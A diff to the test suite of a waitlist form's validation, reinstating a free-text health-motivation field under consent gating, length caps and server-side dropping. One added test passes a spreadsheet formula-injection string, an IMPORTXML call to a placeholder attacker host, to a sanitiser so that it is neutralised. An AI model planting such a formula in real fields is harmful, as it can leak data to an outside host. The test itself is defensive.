@@ -1068,12 +1068,40 @@ await check('Error response never echoes submitted input', 'no email in body', a
     });
   }
 
-  await check('motivation_other is gone — no free text beside the Art 9 question', '400', async () => {
-    // Removed 2026-08-18. A fixed list bounds what we can learn about someone's
-    // health; an open box does not, and this is the one question where that
-    // matters most. An unknown key 400s, which is the loud outcome.
-    const r = await post(growthPayload({ consent_health: true, motivation: ['other'], motivation_other: 'anything' }));
+  // Reinstated 2026-08-19. Accepted, but only inside the health gate and only
+  // paired to an actual "other" selection — the same two conditions every other
+  // free-text box in the health block has to satisfy.
+  await check('motivation_other accepted with health consent + "other" selected', '200', async () => {
+    const r = await post(growthPayload({
+      consent_health: true, motivation: ['other'], motivation_other: 'Doctor suggested it',
+    }));
+    return { pass: r.status === 200, actual: String(r.status) };
+  });
+  await check('motivation_other DROPPED without health consent', 'not stored', async () => {
+    const { validateWaitlist } = await import('../src/lib/validation.js');
+    const v = validateWaitlist({
+      email: 'a@gmail.com', consent_marketing: true,
+      consent_health: false, motivation: ['other'], motivation_other: 'something private',
+    });
+    // Validates — the drop is server-side, not a rejection — but nothing is kept.
+    const stored = v.ok && v.data.consent_health ? v.data.motivation_other : null;
+    return { pass: v.ok && stored === null, actual: `consent_health=${v.data?.consent_health}, stored=${JSON.stringify(stored)}` };
+  });
+  await check('motivation_other requires "other" actually selected', '400', async () => {
+    const r = await post(growthPayload({
+      consent_health: true, motivation: ['gut_health'], motivation_other: 'typed anyway',
+    }));
     return { pass: r.status === 400, actual: String(r.status) };
+  });
+  await check('motivation_other capped at 60, like dietary_other', '<=60 ok, >60 400', async () => {
+    const ok = await post(growthPayload({ consent_health: true, motivation: ['other'], motivation_other: 'x'.repeat(60) }));
+    const no = await post(growthPayload({ consent_health: true, motivation: ['other'], motivation_other: 'x'.repeat(61) }));
+    return { pass: ok.status === 200 && no.status === 400, actual: `60->${ok.status}, 61->${no.status}` };
+  });
+  await check('Formula payload in motivation_other neutralised', "prefixed with '", async () => {
+    const { sanitizeForSheet } = await import('../src/lib/validation.js');
+    const out = sanitizeForSheet('=IMPORTXML("https://attacker.example","//a")');
+    return { pass: out.startsWith("'"), actual: out.slice(0, 30) + '…' };
   });
 
   await check('dietary_other capped at 60, not 120', '<=60 ok, >60 400', async () => {
